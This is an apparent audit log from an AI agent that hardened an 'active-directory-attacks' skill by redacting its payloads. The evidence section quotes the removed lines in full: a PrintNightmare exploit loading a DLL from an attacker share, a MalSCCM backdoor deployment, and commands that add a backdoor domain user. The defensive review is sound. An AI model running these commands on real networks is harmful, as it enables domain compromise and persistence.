# Malicious Skill Safety Auditor Run: active-directory-attacks

- **Date:** 2026-04-05
- **Agent:** malicious-skill-safety-auditor
- **Target:** `skills/active-directory-attacks`

## Why it was selected

The `active-directory-attacks` skill is a high-risk offensive skill. Review of the ledger and recent runs showed it was unclaimed. Given its nature, it was highly likely to contain active payloads or unsafe commands.

## Evidence reviewed

- `skills/active-directory-attacks/SKILL.md`
- `skills/active-directory-attacks/references/advanced-attacks.md`

During the review, the following malicious strings and system execution commands were identified:
- A malicious DLL payload in `SKILL.md`: `python3 CVE-2021-1675.py domain.local/user:pass@10.10.10.10 '\\attacker\share\evil.dll'`
- A malicious executable payload in `references/advanced-attacks.md`: `MalSCCM.exe app /create /name:backdoor /uncpath:"\\SCCM\SCCMContentLib$\evil.exe"`
- Active system execution commands adding a backdoor user in `references/advanced-attacks.md` (used with SharpGPOAbuse and SharpWSUS): `"cmd.exe" --Arguments "/c net user backdoor Password123! /add"` and `"C:\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user backdoor Password123! /add\""`

## Files changed or removal decision

The skill was retained but hardened to safely teach the concepts without providing active exploits.
- Replaced the malicious DLL payload in `skills/active-directory-attacks/SKILL.md` with `[REDACTED_MALICIOUS_DLL_PAYLOAD]`.
- Replaced the active system execution commands in `skills/active-directory-attacks/references/advanced-attacks.md` with `[REDACTED_SYSTEM_EXECUTION_COMMAND]`.
- Replaced the malicious executable payload in `skills/active-directory-attacks/references/advanced-attacks.md` with `[REDACTED_MALICIOUS_EXE_PAYLOAD]`.
- Updated `data/maintenance/ledger.json` with the new status and outcome.

## Linked PR or issue

PR-active-directory-attacks-hardening

## Next action

Monitor for re-introduction of active payloads.
